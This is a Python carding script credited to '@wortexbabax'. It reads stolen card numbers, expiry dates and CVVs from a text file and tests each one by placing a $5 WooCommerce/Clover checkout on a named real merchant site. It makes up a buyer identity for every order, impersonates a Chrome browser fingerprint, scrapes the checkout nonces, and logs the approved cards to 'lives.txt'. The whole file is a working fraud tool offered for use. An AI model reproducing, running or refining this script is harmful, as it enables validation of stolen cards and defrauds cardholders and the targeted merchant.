# Author: @wortexbabax
import requests, json, urllib3, time, os, sys, random, re
from urllib.parse import urlencode
from faker import Faker

try:
    from curl_cffi import requests as cf_requests
    HAS_CURL_CFFI = True
except Exception:
    HAS_CURL_CFFI = False

urllib3.disable_warnings()
sys.stdout.reconfigure(encoding='utf-8', errors='replace')

BASE = "https://lacknergroup.com"
SITE_ID = "15106"
PRODUCT_ID = "8122"
PAYMENT_AMOUNT = "5"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36"


def make_session():
    if HAS_CURL_CFFI:
        s = cf_requests.Session(impersonate="chrome120", verify=False)
    else:
        s = requests.Session()
        s.verify = False
    return s


def read_file_any_enc(path):
    with open(path, 'rb') as f:
        raw = f.read()
    for enc in ['utf-8-sig', 'utf-16', 'utf-8', 'latin-1']:
        try:
            return raw.decode(enc).replace('\0', '').replace('\r', '').replace('\ufeff', '')
        except:
            continue
    return raw.decode('utf-8', errors='replace')


def extract_nonce(html, pattern):
    match = re.search(pattern, html)
    return match.group(1) if match else ""


def check_clover(card, exp_month, exp_year, cvv):
    fk = Faker()
    fn = fk.first_name()
    ln = fk.last_name()
    email = f"{fn.lower()}{ln.lower()}{random.randint(100,999)}@gmail.com"
    phone = fk.numerify('##########')
    address = fk.street_address()
    city = fk.city()
    state = fk.state_abbr()
    zipcode = fk.zipcode()
    t0 = time.time()

    s = make_session()

    headers = {
        "User-Agent": UA,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "Accept-Language": "tr-TR,tr;q=0.7",
        "sec-ch-ua": '"Brave";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-gpc": "1",
        "upgrade-insecure-requests": "1",
    }

    try:
        r1 = s.get(f"{BASE}/payments/", headers=headers, timeout=15)

        r2 = s.post(f"{BASE}/wp-admin/admin-ajax.php",
            headers={**headers, "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                     "Origin": BASE, "Referer": f"{BASE}/payments/",
                     "X-Requested-With": "XMLHttpRequest", "Accept": "application/json, text/javascript, */*; q=0.01"},
            data=urlencode({"action": "teamjuh_jam_clore_product_change",
                            "site_id": SITE_ID, "payment_amount": PAYMENT_AMOUNT,
                            "product_id": PRODUCT_ID, "firstname": fn}),
            timeout=15)

        r3 = s.get(f"{BASE}/payments/",
            headers={**headers, "Referer": f"{BASE}/payments/"},
            timeout=15)
        checkout_nonce = extract_nonce(r3.text, r'woocommerce-process-checkout-nonce["\s]+value="([^"]+)"')
        if not checkout_nonce:
            checkout_nonce = extract_nonce(r3.text, r'name="woocommerce-process-checkout-nonce"\s+value="([^"]+)"')
        if not checkout_nonce:
            checkout_nonce = extract_nonce(r3.text, r'"woocommerce-process-checkout-nonce":"([^"]+)"')

        security_nonce = extract_nonce(r3.text, r'update_order_review["\'][^>]*data-nonce="([^"]+)"')
        if not security_nonce:
            security_nonce = extract_nonce(r3.text, r'"security":"([^"]+)"')
        if not security_nonce:
            security_nonce = extract_nonce(r3.text, r'name="woocommerce-process-checkout-nonce"\s+value="([^"]+)"')

        if not checkout_nonce:
            return {"success": False, "msg": "No checkout nonce", "time": round(time.time()-t0, 2)}

        uor_data = urlencode({
            "security": security_nonce or checkout_nonce,
            "payment_method": "clover_payments",
            "country": "US", "state": state,
            "postcode": zipcode, "city": city, "address": address, "address_2": "",
            "s_country": "US", "s_state": state,
            "s_postcode": zipcode, "s_city": city, "s_address": address, "s_address_2": "",
            "has_full_address": "true",
        })
        r4 = s.post(f"{BASE}/?wc-ajax=update_order_review",
            headers={**headers, "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                     "Accept": "*/*", "Origin": BASE, "Referer": f"{BASE}/payments/",
                     "X-Requested-With": "XMLHttpRequest"},
            data=uor_data, timeout=15)
        try:
            r4j = r4.json()
            if r4j.get("nonce"):
                checkout_nonce = r4j["nonce"]
        except:
            pass

        brand = "VISA" if card.startswith("4") else "MASTERCARD" if card.startswith("5") else "DISCOVER" if card.startswith("6") else "AMEX" if card.startswith("3") else "VISA"
        clover_token = ""
        clover_process_nonce = ""

        checkout_fields = {
            "wc_order_attribution_source_type": "typein",
            "wc_order_attribution_referrer": "(none)",
            "wc_order_attribution_utm_campaign": "(none)",
            "wc_order_attribution_utm_source": "(direct)",
            "wc_order_attribution_utm_medium": "(none)",
            "wc_order_attribution_utm_content": "(none)",
            "wc_order_attribution_utm_id": "(none)",
            "wc_order_attribution_utm_term": "(none)",
            "wc_order_attribution_utm_source_platform": "(none)",
            "wc_order_attribution_utm_creative_format": "(none)",
            "wc_order_attribution_utm_marketing_tactic": "(none)",
            "wc_order_attribution_session_entry": "https://lacknergroup.com/payments/",
            "wc_order_attribution_session_start_time": "2026-06-06 21:13:46",
            "wc_order_attribution_session_pages": "3",
            "wc_order_attribution_session_count": "1",
            "wc_order_attribution_user_agent": UA,
            "billing_first_name": fn,
            "billing_last_name": ln,
            "billing_company": "",
            "billing_country": "US",
            "billing_address_1": address,
            "billing_address_2": "",
            "billing_city": city,
            "billing_state": state,
            "billing_postcode": zipcode,
            "billing_phone": phone,
            "billing_email": email,
            "site_id": SITE_ID,
            "payment_amount": PAYMENT_AMOUNT,
            "order_comments": "",
            "payment_method": "clover_payments",
            "woocommerce-process-checkout-nonce": checkout_nonce,
            "_wp_http_referer": "/?wc-ajax=update_order_review",
        }
        checkout_fields["clover_payments-card-number"] = card
        checkout_fields["clover_payments-card-expiry"] = f"{int(exp_month):02d} / {str(exp_year)[-2:]}"
        checkout_fields["clover_payments-card-cvc"] = cvv
        checkout_data = urlencode(checkout_fields)

        r6 = s.post(f"{BASE}/?wc-ajax=checkout",
            headers={**headers, "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                     "Accept": "application/json, text/javascript, */*; q=0.01",
                     "Origin": BASE, "Referer": f"{BASE}/payments/",
                     "X-Requested-With": "XMLHttpRequest"},
            data=checkout_data, timeout=30)

        resp = r6.text
        elapsed = round(time.time() - t0, 2)

        try:
            rj = r6.json()
        except:
            rj = {}

        if rj.get("result") == "success":
            return {"success": True, "msg": "Approved", "time": elapsed, "email": email}

        if rj.get("result") == "failure":
            msgs = rj.get("messages", "")
            m = re.search(r'<li[^>]*>(.*?)</li>', msgs, re.DOTALL)
            err = m.group(1).strip() if m else msgs[:300]
            return {"success": False, "msg": err, "time": elapsed}

        if "thankyou" in resp.lower() or "order-received" in resp.lower():
            return {"success": True, "msg": "Approved", "time": elapsed, "email": email}

        return {"success": False, "msg": f"Status {r6.status_code}", "time": elapsed,
                "raw": resp[:500]}

    except Exception as e:
        return {"success": False, "msg": f"{type(e).__name__}: {str(e)[:80]}",
                "time": round(time.time()-t0, 2)}


if __name__ == "__main__":
    if not os.path.exists("cc.txt"):
        print("cc.txt not found")
        exit(1)

    cards = [x.strip() for x in read_file_any_enc("cc.txt").splitlines() if x.strip()]
    print("dev wortexbabax")

    for i, line in enumerate(cards, 1):
        parts = line.split("|")
        if len(parts) >= 4:
            card = parts[0].strip()
            month = parts[1].strip()
            year = parts[2].strip()
            cvv = parts[3].strip()
            if len(year) == 2:
                year = "20" + year

            result = check_clover(card, month, year, cvv)
            status = "Approved" if result["success"] else "Declined"
            print(f"  -> {status} | {line} | {result['msg']} | {result['time']}s")

            with open('lives.txt' if result['success'] else 'declined.txt', 'a', encoding='utf-8') as f:
                f.write(f"{line} | {status} | {result['msg']} | {result['time']}s\n")
